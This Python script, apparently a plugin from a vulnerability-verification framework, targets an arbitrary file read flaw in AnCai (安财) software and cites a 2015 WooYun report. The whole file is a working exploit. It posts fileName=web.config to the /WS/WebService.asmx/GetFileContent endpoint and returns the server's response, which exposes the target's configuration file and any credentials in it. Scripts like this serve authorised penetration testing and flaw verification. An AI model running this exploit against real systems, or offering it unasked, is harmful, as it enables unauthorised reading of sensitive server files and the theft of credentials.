#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 安财软件GetFileContent任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2015-0121651
author: Lucifer
description: 文件/WS/WebService.asmx/GetFileContent中,参数fileName存在任意文件读取。
'''
import sys
import json
import requests

class acsoft_GetFileContent_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "Content":"1",
            "fileName":"web.config"
        }
        payload = "/WS/WebService.asmx/GetFileContent"
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                return True,vulnurl,"安财软件GetFileContent任意文件读取",payload,req.text
            else:
                return False,None,None,None,None
        except:
            return False, None, None, None, None

if __name__ == "__main__":
    testVuln = acsoft_GetFileContent_fileread_BaseVerify(sys.argv[1])
    testVuln.run()